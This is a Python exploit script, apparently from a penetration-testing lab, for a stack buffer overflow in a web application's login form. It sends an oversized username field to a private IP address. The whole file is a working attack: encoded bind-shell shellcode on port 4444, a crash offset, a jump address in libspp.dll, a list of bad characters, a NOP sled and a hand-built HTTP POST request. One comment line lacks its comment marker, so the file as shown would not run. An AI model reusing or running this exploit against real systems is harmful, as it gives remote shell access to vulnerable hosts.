#!/usr/bin/python
import socket
import os
import sys

#crash = "A" * 1000
# jmp = 10 09 0c 83 libspp.dll
# bad char = 00 0A 0D 25 26 2B 3D

bind shell on port 4444
buf =  ""
buf += "\xb8\x3b\xcc\xbe\xaa\xdb\xd2\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\x78\xc2\x5c"
buf += "\x5f\x82\x32\x22\xa0\x7a\xc3\x43\x28\x9f\xf2\x43\x4e"
buf += "\xd4\xa5\x73\x04\xb8\x49\xff\x48\x28\xd9\x8d\x44\x5f"
buf += "\x6a\x3b\xb3\x6e\x6b\x10\x87\xf1\xef\x6b\xd4\xd1\xce"
buf += "\xa3\x29\x10\x16\xd9\xc0\x40\xcf\x95\x77\x74\x64\xe3"
buf += "\x4b\xff\x36\xe5\xcb\x1c\x8e\x04\xfd\xb3\x84\x5e\xdd"
buf += "\x32\x48\xeb\x54\x2c\x8d\xd6\x2f\xc7\x65\xac\xb1\x01"
buf += "\xb4\x4d\x1d\x6c\x78\xbc\x5f\xa9\xbf\x5f\x2a\xc3\xc3"
buf += "\xe2\x2d\x10\xb9\x38\xbb\x82\x19\xca\x1b\x6e\x9b\x1f"
buf += "\xfd\xe5\x97\xd4\x89\xa1\xbb\xeb\x5e\xda\xc0\x60\x61"
buf += "\x0c\x41\x32\x46\x88\x09\xe0\xe7\x89\xf7\x47\x17\xc9"
buf += "\x57\x37\xbd\x82\x7a\x2c\xcc\xc9\x12\x81\xfd\xf1\xe2"
buf += "\x8d\x76\x82\xd0\x12\x2d\x0c\x59\xda\xeb\xcb\x9e\xf1"
buf += "\x4c\x43\x61\xfa\xac\x4a\xa6\xae\xfc\xe4\x0f\xcf\x96"
buf += "\xf4\xb0\x1a\x02\xfc\x17\xf5\x31\x01\xe7\xa5\xf5\xa9"
buf += "\x80\xaf\xf9\x96\xb1\xcf\xd3\xbf\x5a\x32\xdc\xae\xc6"
buf += "\xbb\x3a\xba\xe6\xed\x95\x52\xc5\xc9\x2d\xc5\x36\x38"
buf += "\x06\x61\x7e\x2a\x91\x8e\x7f\x78\xb5\x18\xf4\x6f\x01"
buf += "\x39\x0b\xba\x21\x2e\x9c\x30\xa0\x1d\x3c\x44\xe9\xf5"
buf += "\xdd\xd7\x76\x05\xab\xcb\x20\x52\xfc\x3a\x39\x36\x10"
buf += "\x64\x93\x24\xe9\xf0\xdc\xec\x36\xc1\xe3\xed\xbb\x7d"
buf += "\xc0\xfd\x05\x7d\x4c\xa9\xd9\x28\x1a\x07\x9c\x82\xec"
buf += "\xf1\x76\x78\xa7\x95\x0f\xb2\x78\xe3\x0f\x9f\x0e\x0b"
buf += "\xa1\x76\x57\x34\x0e\x1f\x5f\x4d\x72\xbf\xa0\x84\x36"
buf += "\xcf\xea\x84\x1f\x58\xb3\x5d\x22\x05\x44\x88\x61\x30"
buf += "\xc7\x38\x1a\xc7\xd7\x49\x1f\x83\x5f\xa2\x6d\x9c\x35"
buf += "\xc4\xc2\x9d\x1f"


crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"*16 + buf

fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.211.149\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.211.149/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.211.149", 80))
expl.send(buffer)
expl.close()
